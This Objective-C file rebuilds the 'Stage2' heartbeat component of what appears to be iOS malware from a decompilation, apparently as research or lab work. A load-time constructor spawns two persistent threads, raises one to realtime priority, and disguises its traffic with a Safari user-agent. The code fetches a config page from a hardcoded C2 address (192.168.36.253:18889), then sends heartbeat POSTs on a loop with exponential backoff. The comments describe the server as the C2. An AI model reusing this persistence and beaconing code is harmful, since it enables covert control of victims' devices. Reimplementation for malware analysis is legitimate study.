#import <Foundation/Foundation.h>
#import <CFNetwork/CFNetwork.h>
#import <pthread.h>
#import <mach/mach.h>
#import <mach/mach_time.h>
#import <sched.h>

/* ============================================================
 * Stage2 (plain heartbeat) -- rebuilt from real Stage2 decompilation
 * (decompiled.c) so the connection is PERSISTENT.
 *
 * Real mechanism (per PLCoreHeartbeatMonitor):
 *   startMonitoringWithPort_ (0x817e4):
 *     - two resident pthreads: receiver thread named
 *       "plasma_core_heartbeat_receiver" (FUN_000818c4) + sender/
 *       keeper thread (FUN_00081af4)
 *     - receiver raises realtime sched priority
 *       (sched_get_priority_max(policy)-1)
 *     - both threads run `while((stop&1)==0)` loops so they never
 *       depend on the main thread / runloop / GCD scheduling.
 *   Heartbeat sender does exponential backoff on failure
 *   (5.0 * exp2(n), capped at DAT_0008ed00) instead of a bare
 *   fixed sleep, mirroring the outer payload-manager retry loop.
 * ============================================================ */

static NSString *const kBaseURL = @"http://192.168.36.253:18889";
static NSString *const kEventPath = @"/event";
static NSString *const kUserAgent =
    @"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) "
    @"AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1";

static volatile int32_t gStop = 0;

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSDictionary *extraHeaders, NSInteger *statusOut);

/* ---------------- HTTP helper (CFNetwork) ---------------- */

static NSData *PLHTTPRequest(NSString *urlString, NSString *method, NSData *postBody, NSDictionary *extraHeaders, NSInteger *statusOut) {
    if (statusOut) *statusOut = -1;
    CFStringRef cfUrl = CFStringCreateWithCString(NULL, urlString.UTF8String, kCFStringEncodingUTF8);
    if (!cfUrl) return nil;
    CFURLRef url = CFURLCreateWithString(NULL, cfUrl, NULL);
    CFRelease(cfUrl);
    if (!url) return nil;

    CFHTTPMessageRef req = CFHTTPMessageCreateRequest(
        NULL,
        (__bridge CFStringRef)method,
        url,
        kCFHTTPVersion1_1);
    CFRelease(url);
    if (!req) return nil;

    CFHTTPMessageSetHeaderFieldValue(req, CFSTR("User-Agent"),
        (__bridge CFStringRef)kUserAgent);
    [extraHeaders enumerateKeysAndObjectsUsingBlock:^(NSString *k, NSString *v, BOOL *stop) {
        CFHTTPMessageSetHeaderFieldValue(req, (__bridge CFStringRef)k,
            (__bridge CFStringRef)v);
    }];
    if (postBody && postBody.length > 0) {
        CFHTTPMessageSetBody(req, (__bridge CFDataRef)postBody);
        CFHTTPMessageSetHeaderFieldValue(req, CFSTR("Content-Type"),
            CFSTR("application/json"));
    }

    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(NULL, req);
    CFRelease(req);
    if (!stream) return nil;

    if (!CFReadStreamOpen(stream)) {
        CFRelease(stream);
        return nil;
    }

    NSMutableData *out = [NSMutableData data];
    uint8_t buf[8192];
    CFIndex n;
    while ((n = CFReadStreamRead(stream, buf, sizeof(buf))) > 0) {
        [out appendBytes:buf length:(NSUInteger)n];
    }

    CFHTTPMessageRef resp = (CFHTTPMessageRef)CFReadStreamCopyProperty(
        stream, kCFStreamPropertyHTTPResponseHeader);
    if (statusOut && resp) {
        *statusOut = CFHTTPMessageGetResponseStatusCode(resp);
    }
    if (resp) CFRelease(resp);
    CFReadStreamClose(stream);
    CFRelease(stream);
    return out;
}

/* ---------------- heartbeat engine (plain) ---------------- */

static NSString *SaveDir(void) {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    return paths.firstObject ?: @"/tmp";
}

static NSInteger PLSendHeartbeat(void) {
    NSDate *now = [NSDate date];
    NSString *ts = [NSString stringWithFormat:@"%.0f", now.timeIntervalSince1970 * 1000.0];
    NSDictionary *payload = @{
        @"ts": ts,
        @"t": @"hb",
    };
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    NSString *plainString = [ts stringByAppendingString:
        [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding]];
    NSData *plain = [plainString dataUsingEncoding:NSUTF8StringEncoding];

    NSString *url = [kBaseURL stringByAppendingString:kEventPath];
    NSInteger status = 0;
    NSDictionary *headers = @{ @"x-ts": ts };
    NSData *resp = PLHTTPRequest(url, @"POST", plain, headers, &status);

    NSString *logFile = [SaveDir() stringByAppendingPathComponent:@"heartbeat_log.txt"];
    NSString *logEntry = [NSString stringWithFormat:@"%@ - ts=%@ status=%ld resp=%zu\n",
                          [NSDate date], ts, (long)status, resp.length];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:logFile];
    if (!fh) {
        [logEntry writeToFile:logFile atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } else {
        [fh seekToEndOfFile];
        [fh writeData:[logEntry dataUsingEncoding:NSUTF8StringEncoding]];
        [fh closeFile];
    }
    NSLog(@"[stage2] heartbeat(plain): %zuB status=%ld resp=%zu",
          plain.length, (long)status, resp.length);
    return status;
}

/* ---------------- resident threads (mirror real Stage2) ---------------- */

#define SCHED_POLICY_REALTIME 4 /* SCHED_FIFO on Darwin */

static void PLSetThreadName(const char *name) {
    pthread_setname_np(name);
}

static void PLRaiseThreadPriority(void) {
    struct sched_param p;
    memset(&p, 0, sizeof(p));
    int maxPrio = sched_get_priority_max(SCHED_POLICY_REALTIME);
    if (maxPrio > 0) {
        p.sched_priority = maxPrio - 1;
    } else {
        int pol_default = SCHED_OTHER;
        int m = sched_get_priority_max(pol_default);
        if (m > 0) p.sched_priority = m;
    }
    /* best-effort; ignore EPERM so we keep running as normal priority */
    pthread_setschedparam(pthread_self(), SCHED_POLICY_REALTIME, &p);
}

/* Receiver/keeper thread: FUN_000818c4 equivalent.
 * Real code blocks on mach_msg() with 500ms timeout to keep the process
 * alive without touching runloop; we mirror that with a 500ms sleep loop. */
static void *PLHeartbeatReceiverLoop(void *arg) {
    @autoreleasepool {
        PLSetThreadName("plasma_core_heartbeat_receiver");
        PLRaiseThreadPriority();
        NSLog(@"[stage2] receiver thread started");
        while (!gStop) {
            usleep(500000);
        }
    }
    return NULL;
}

/* Startup handshake: GET config endpoint once (real Stage2 fetches
 * show.html / config before heartbeat POSTs). Response is ignored --
 * the C2 returns a plain 200, no decryption needed. */
static void PLStartupHandshake(void) {
    NSString *url = [kBaseURL stringByAppendingString:@"/details/show.html"];
    NSInteger status = 0;
    NSData *resp = PLHTTPRequest(url, @"GET", nil, nil, &status);
    NSLog(@"[stage2] GET show.html: status=%ld len=%zu",
          (long)status, resp.length);
}

/* Sender thread: FUN_00081af4 + outer payload-manager retry loop.
 * Success -> 10s cadence. Failure -> exponential backoff
 * 5 * 2^attempt seconds, capped at 120s, then next attempt. */
static void *PLHeartbeatSenderLoop(void *arg) {
    @autoreleasepool {
        PLSetThreadName("plasma_core_heartbeat_sender");
        NSLog(@"[stage2] heartbeat sender started");
        PLStartupHandshake();
        uint32_t attempt = 0;
        while (!gStop) {
            NSInteger status = PLSendHeartbeat();
            if (status > 0 && status < 500) {
                attempt = 0;
                int ticks = 0;
                while (!gStop && ticks < 10) { /* 10s cadence */
                    usleep(1000000);
                    ticks++;
                }
            } else {
                double seconds = 5.0 * exp2((double)MIN(attempt, 5u));
                if (seconds > 120.0) seconds = 120.0;
                NSLog(@"[stage2] heartbeat failed status=%ld, backoff %.0fs",
                      (long)status, seconds);
                int ticks = 0;
                while (!gStop && (double)ticks * 0.5 < seconds) {
                    usleep(500000);
                    ticks++;
                }
                attempt++;
            }
        }
    }
    return NULL;
}

__attribute__((constructor))
static void Stage2Entry(void) {
    static pthread_t gRxThread;
    static pthread_t gTxThread;
    if (gRxThread || gTxThread) return;

    if (pthread_create(&gRxThread, NULL, PLHeartbeatReceiverLoop, NULL) != 0) {
        NSLog(@"[stage2] receiver pthread_create failed");
        gRxThread = 0;
        return;
    }
    if (pthread_create(&gTxThread, NULL, PLHeartbeatSenderLoop, NULL) != 0) {
        NSLog(@"[stage2] sender pthread_create failed");
        gStop = 1;
        pthread_join(gRxThread, NULL);
        gRxThread = 0;
        gTxThread = 0;
        return;
    }
    pthread_detach(gRxThread);
    pthread_detach(gTxThread);
}